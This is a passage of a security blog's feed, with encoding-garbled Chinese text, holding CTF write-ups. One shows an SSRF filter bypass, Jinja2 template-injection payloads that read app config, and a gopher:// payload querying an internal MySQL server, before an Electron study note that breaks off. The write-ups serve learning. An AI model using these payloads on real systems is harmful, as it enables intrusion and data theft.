--http2-prior-knowledge</code>ËÆøÈóÆÔºåËé∑ÂæóÂÜôÂú®ËøîÂõûÂ§¥ÈÉ®<code>set-cookie</code>ÁöÑflagÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># From F1sh's blog</span><span class="token keyword">import</span> socketa <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"response.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">2333</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'ËøûÊé•Âú∞ÂùÄÔºö'</span><span class="token punctuation">,</span> addr    c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>ÊâßË°å<code>curl -vv --http2-prior-knowledge 127.0.0.1:6777 --output -</code>ËøîÂõûÁöÑÊï∞ÊçÆÔºö</p><pre class=" language-response"><code class="language-response">* Rebuilt URL to: 127.0.0.1:6777/*   Trying 127.0.0.1...* TCP_NODELAY set* Connected to 127.0.0.1 (127.0.0.1) port 6777 (#0)* Using HTTP2, server supports multi-use* Connection state changed (HTTP/2 confirmed)* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0* Using Stream ID: 1 (easy handle 0x55d0f3f35520)> GET / HTTP/2> Host: 127.0.0.1:6777> User-Agent: curl/7.61.0> Accept: */*> * Connection state changed (MAX_CONCURRENT_STREAMS == 128)!< HTTP/2 200 < server: nginx/1.14.0 (Ubuntu)< date: Wed, 30 Jan 2019 16:02:53 GMT< content-type: text/html; charset=UTF-8< set-cookie: F1ag:flag{Http2_Mak3_a_Differ3nce}=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0< * Closing connection 0U hav3 g0t Me!!!%                  </code></pre><p>[+] GET==&gt; F1ag:flag{Http2_Mak3_a_Differ3nce}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="ÁΩëÁªúÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="http://www.yof3ng.xyz/tags/ssrf/"/>
    
      <category term="ÁΩëÁªúÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>ÊüêÂÖ•Áæ§È¢òËß£È¢òËÆ∞ÂΩï</title>
    <link href="http://www.yof3ng.xyz/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.yof3ng.xyz/2019/01/29/ÊüêÂÖ•Áæ§È¢òËß£È¢òËÆ∞ÂΩï/</id>
    <published>2019-01-29T13:58:02.000Z</published>
    <updated>2019-04-02T08:47:14.376Z</updated>
    
    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã"><a href="#ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã" class="headerlink" title="ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã"></a>ËÆ∞ÊüêÂÖ•Áæ§È¢òËß£È¢òËøáÁ®ã</h1><p>Èó≤Êù•Êó†‰∫ãÔºåÁúã‰ºó‰∫∫Á∫∑Á∫∑Âú®Áé©ÂÖ•Áæ§È¢òÔºåÁ∫µ‰ΩøÊàëËèúÁöÑ‰∏çÊï¢Âä®ÊâãÔºå‰πüÊÉ≥Â∞ùËØï‰∏Ä‰∏ã„ÄÇ</p><h2 id="0x01-ËøéÈù¢ËÄåÊù•ÁöÑSSRF"><a href="#0x01-ËøéÈù¢ËÄåÊù•ÁöÑSSRF" class="headerlink" title="0x01 ËøéÈù¢ËÄåÊù•ÁöÑSSRF"></a>0x01 ËøéÈù¢ËÄåÊù•ÁöÑSSRF</h2><p>È¶ñÂÖàËÆøÈóÆÈ¢òÁõÆÂú∞ÂùÄÔºö</p><p><code>index.phpÊ∫êÁ†Å</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">try</span>     <span class="token punctuation">{</span>         <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token punctuation">.</span><span class="token string">' is inner ip'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>ÊÑèÊÄùÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá<code>http|https|gopher|dict</code>ÂõõÁßçÂçèËÆÆËøõË°åCurlÊìç‰ΩúÔºåÂπ∂‰∏îÊé¢ÊµãÂà∞ÁöÑÂÜÖÂÆπ‰ºöÈÄöËøá<code>var_dump($output);</code>ÊâìÂç∞Âá∫Êù•Ôºå‰ΩÜÊòØÂÆÉ‰ºöÂØπÊàë‰ª¨Êé¢ÊµãÁöÑipÂú∞ÂùÄËøõË°åcheckÔºåÁúãÊòØÂê¶‰∏∫ÂÜÖÁΩëÂú∞ÂùÄÔºà<a href="https://www.cnblogs.com/afanti/p/9928371.html" target="_blank" rel="noopener">ÂèØ‰ª•ËøõË°åbypassÔºåËøôÈ¢òÁöÑssrf‰∏é‰∏äÊµ∑Â§ßÂ≠¶ÁîüÁΩëÂÆâËµõÊüêÊò•ÁßãÂá∫ÁöÑÈ¢òÊúâ‰∫õËÆ∏Á±ª‰ºº</a>Ôºâ„ÄÇ</p><pre class=" language-php+HTML"><code class="language-php+HTML">payload1: ?url=http://127.0.0.1./flag.phppayload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php</code></pre><p>ÂéüÁêÜÔºö<a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">Some trick in ssrf and unserialize()</a>/#some-trick-in-unserialize)</p><h2 id="0x02-Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã"><a href="#0x02-Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã" class="headerlink" title="0x02 Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã"></a>0x02 Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã</h2><p><code>PS: ÊÉ≥ÂÜô‰∏Ä‰∏™Ëá™Âä®ÂåñÁöÑSSRFÊé¢ÊµãÂ∑•ÂÖ∑</code></p><p>ÈÄöËøábpÁöÑintruderÊ®°ÂùóÔºåÂØπÂÜÖÁΩëÁΩëÊÆµÁöÑÂ∏∏Áî®Á´ØÂè£ËøõË°åÊúçÂä°Êé¢ÊµãÔºà172.11.243.0/24ÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129211758.png" alt=""></p><p>ÂèØ‰ª•ÂæóÂà∞<code>172.11.243.81:8080</code>Âíå<code>172.11.243.218:3306</code>ÔºåÂàÜÂà´‰∏∫‰∏Ä‰∏™flaskÊúçÂä°ÂíåmysqlÊúçÂä°„ÄÇ</p><p>source code of flask service:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'HINT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'HINT'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/yulige/&lt;path:yulige>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">yulige</span><span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>Ê†πÊçÆÊ∫êÁ†Å‰∏≠Âá∫Áé∞ÁöÑ<code>flask.render_template_string</code>ÔºåÂèØ‰ª•Áü•ÈÅìËøôÊòØËÄÉSSTIÊ®°ÊùøÊ≥®ÂÖ•Ôºå‰ΩÜÊòØËøôÈáåÂØπ<code>(„ÄÅ)„ÄÅconfig„ÄÅself</code>ËøõË°å‰∫ÜËøáÊª§ÔºåÊó†Ê≥ïËøõË°åÂ∏∏ËßÑÁöÑÊìç‰ΩúÔºåÊ≥®ÊÑèÂà∞<code>app.config[&#39;HINT&#39;] = os.environ.pop(&#39;HINT&#39;)</code>ÔºåÂèØ‰ª•ÊÉ≥ÂäûÊ≥ïgetÂà∞HINTÁöÑÂÄºÔºåÂèØ‰ª•ÂèÇËÄÉ<a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">‰ªéSSTIÂà∞Ê≤ôÁÆ±ÈÄÉÈÄ∏-jinja2</a>„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#payload:{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}</span><span class="token comment" spellcheck="true">#payload:{{get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]}}</span></code></pre><p>ÊãøpayloadÊâì‰∏ÄÂèëÂêéÊãøÂà∞‰∫ÜHINTÈáåÈù¢ÁöÑmysqlÁî®Êà∑Âêç„ÄÇ</p><h2 id="0x03-ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏"><a href="#0x03-ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏" class="headerlink" title="0x03 ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏"></a>0x03 ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏</h2><p>Ê≥®ÊÑèÂà∞ÊúÄÂºÄÂßãÂÖÅËÆ∏Êàë‰ª¨‰ΩøÁî®ÁöÑÂçèËÆÆ‰∏≠ÂåÖÊã¨<code>gopher</code>ÂçèËÆÆÔºåÈÄöËøá<code>ssrfÔºãgopher</code>Êàë‰ª¨ÂèØ‰ª•ÂØπÊú™ËÆæÁΩÆÂØÜÁ†ÅÁöÑmysqlÊúçÂä°ËøõË°åÊîªÂáªÔºåËøôÈáåÁî®Âà∞Github‰∏äÈù¢‰∏Ä‰∏™Â•Ω‰∏úË•ø<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a>„ÄÇ</p><p>ÂàóÊï∞ÊçÆÂ∫ìÂêçÔºà‰æùÊ¨°Á±ªÊé®ÔºåÊãøË°®ÂêçÔºåÊãøÂàóÂêçÔºågetflagÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214016.png" alt=""></p><p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÊàë‰ª¨ÊòØÂú®ÊâìssrfÔºåÈÄöËøáË∑≥ÊùøÊâìÂÜÖÁΩëÔºåpayload‰∏≠ÁöÑurlÁºñÁ†ÅÈúÄË¶ÅËøõË°å‰∫åÊ¨°ÁºñÁ†ÅÊâçËÉΩÊ≠£Â∏∏ÂèëÊå•‰ΩúÁî®Ôºö</p><pre class=" language-payload"><code class="language-payload">url=gopher://172.11.243.218:3306/_%25ae%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%252c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%252e%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</code></pre><p>get flagÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214508.png" alt=""></p><h2 id="0x04-Â∞èÁªì"><a href="#0x04-Â∞èÁªì" class="headerlink" title="0x04 Â∞èÁªì"></a>0x04 Â∞èÁªì</h2><p>ÁéØÂ¢ÉÂíåÊ∞õÂõ¥ÔºåÈ¢òÁõÆÁöÑË¥®ÈáèÔºåÈÉΩËÉΩÂÜ≥ÂÆö‰Ω†Ëá™Â∑±ÁöÑËøõÊ≠•ÈÄüÂ∫¶„ÄÇÂΩìÁÑ∂ÔºåÊúÄÈáçË¶ÅÁöÑËøòÊòØ‰Ω†Ëá™Â∑±ÁöÑÂùöÊåÅÂíåÂä™Âäõ„ÄÇ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="‰ø°ÊÅØÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="SSRF" scheme="http://www.yof3ng.xyz/tags/SSRF/"/>
    
      <category term="ÂÜÖÁΩë" scheme="http://www.yof3ng.xyz/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Electron-Learning-1</title>
    <link href="http://www.yof3ng.xyz/2019/01/25/Electron-Learning-1/"/>
    <id>http://www.yof3ng.xyz/2019/01/25/Electron-Learning-1/</id>
    <published>2019-01-25T05:09:44.000Z</published>
    <updated>2019-04-02T09:04:06.606Z</updated>
    
    <content type="html"><![CDATA[<p>Electron.</p><a id="more"></a>    <h1 id="Electron-Â≠¶‰π†ËÆ∞ÂΩï"><a href="#Electron-Â≠¶‰π†ËÆ∞ÂΩï" class="headerlink" title="Electron Â≠¶‰π†ËÆ∞ÂΩï"></a>Electron Â≠¶‰π†ËÆ∞ÂΩï</h1><blockquote><p>ÂèÇËÄÉ ÈìæÊé•Ôºö</p><p><a href="https://www.jianshu.com/p/1687f8dcd70c" target="_blank" rel="noopener">ÂºÄÂèë Electron app ÂøÖÁü•ÁöÑ 4 ‰∏™ tips</a></p><p><a href="https://www.w3cschool.cn/electronmanual/" target="_blank" rel="noopener">Electronn‰∏≠ÊñáÊâãÂÜå</a></p><p><a href="https://mlln.cn/2018/01/08/electron%E4%BD%9C%E4%B8%BApython%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Electron‰∏épython</a></p><p><a href="https://www.jianshu.com/p/59a0a24ed388" target="_blank" rel="noopener">3ÂàÜÈíü‰∏äÊâãÔºöÈÄöËøávueÂíåelectronÂàõÂª∫Ê°åÈù¢Â∫îÁî®</a> </p></blockquote><h2 id="Electron-ÁÆÄ‰ªã"><a href="#Electron-ÁÆÄ‰ªã" class="headerlink" title="Electron ÁÆÄ‰ªã"></a>Electron ÁÆÄ‰ªã</h2><p>ÂºïÁî®W3schoolÁöÑElectron‰∏≠ÊñáÊñáÊ°£ÁÆÄ‰ªãÔºö</p><blockquote><p>Electron ÂèØ‰ª•ËÆ©‰Ω†‰ΩøÁî®Á∫Ø <a href="https://www.w3cschool.cn/javascript/" target="_blank" rel="noopener">JavaScript</a> Ë∞ÉÁî®‰∏∞ÂØåÁöÑÂéüÁîü APIs Êù•ÂàõÈÄ†Ê°åÈù¢Â∫îÁî®„ÄÇ‰Ω†ÂèØ‰ª•ÊääÂÆÉÁúã‰ΩúÊòØ‰∏ìÊ≥®‰∫éÊ°åÈù¢Â∫îÁî®ËÄå‰∏çÊòØ web ÊúçÂä°Âô®ÁöÑÔºåio.js ÁöÑ‰∏Ä‰∏™Âèò‰Ωì„ÄÇ</p><p>Ëøô‰∏çÊÑèÂë≥ÁùÄ Electron ÊòØÁªëÂÆö‰∫Ü GUI Â∫ìÁöÑ JavaScript„ÄÇÁõ∏ÂèçÔºåElectron ‰ΩøÁî® web È°µÈù¢‰Ωú‰∏∫ÂÆÉÁöÑ GUIÔºåÊâÄ‰ª•‰Ω†ËÉΩÊääÂÆÉÁúã‰ΩúÊàê‰∏Ä‰∏™Ë¢´ JavaScript ÊéßÂà∂ÁöÑÔºåÁ≤æÁÆÄÁâàÁöÑ Chromium ÊµèËßàÂô®„ÄÇ</p></blockquote><h3 id="‰∏ªËøõÁ®ãÔºàMain-ProcessÔºâ"><a href="#‰∏ªËøõÁ®ãÔºàMain-ProcessÔºâ" class="headerlink" title="‰∏ªËøõÁ®ãÔºàMain ProcessÔºâ"></a>‰∏ªËøõÁ®ãÔºàMain ProcessÔºâ</h3><p>Âú® Electron ÈáåÔºåËøêË°å <code>package.json</code> Èáå <code>main</code> ËÑöÊú¨ÁöÑËøõÁ®ãË¢´Áß∞‰∏∫<strong>‰∏ªËøõÁ®ã</strong>„ÄÇÂú®‰∏ªËøõÁ®ãËøêË°åÁöÑËÑöÊú¨ÂèØ‰ª•‰ª•ÂàõÂª∫ web È°µÈù¢ÁöÑÂΩ¢ÂºèÂ±ïÁ§∫ GUI„ÄÇ</p><h3 id="Ê∏≤ÊüìËøõÁ®ãÔºàRenderer-ProcessÔºâ"><a href="#Ê∏≤ÊüìËøõÁ®ãÔºàRenderer-ProcessÔºâ" class="headerlink" title="Ê∏≤ÊüìËøõÁ®ãÔºàRenderer ProcessÔºâ"></a>Ê∏≤ÊüìËøõÁ®ãÔºàRenderer ProcessÔºâ</h3><p>Áî±‰∫é Electron ‰ΩøÁî® Chromium Êù•Â±ïÁ§∫È°µÈù¢ÔºåÊâÄ‰ª• Chromium ÁöÑÂ§öËøõÁ®ãÁªìÊûÑ‰πüË¢´ÂÖÖÂàÜÂà©Áî®„ÄÇÊØè‰∏™ Electron ÁöÑÈ°µÈù¢ÈÉΩÂú®ËøêË°åÁùÄËá™Â∑±ÁöÑËøõÁ®ãÔºåËøôÊ†∑ÁöÑËøõÁ®ãÊàë‰ª¨Áß∞‰πã‰∏∫<strong>Ê∏≤ÊüìËøõÁ®ã</strong>„ÄÇ</p><p>Âú®‰∏ÄËà¨ÊµèËßàÂô®‰∏≠ÔºåÁΩëÈ°µÈÄöÂ∏∏‰ºöÂú®Ê≤ôÁõíÁéØÂ¢É‰∏ãËøêË°åÔºåÂπ∂‰∏î‰∏çÂÖÅËÆ∏ËÆøÈóÆÂéüÁîüËµÑÊ∫ê„ÄÇÁÑ∂ËÄåÔºå<code>Electron Áî®Êà∑Êã•ÊúâÂú®ÁΩëÈ°µ‰∏≠Ë∞ÉÁî® io.js ÁöÑ APIs ÁöÑËÉΩÂäõ</code>ÔºåÂèØ‰ª•‰∏éÂ∫ïÂ±ÇÊìç‰ΩúÁ≥ªÁªüÁõ¥Êé•‰∫§‰∫í„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190124203528.png" alt="ËøêË°åÊ¶ÇËø∞"></p><h2 id="Electron-Âú®Á∫ø-Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã"><a 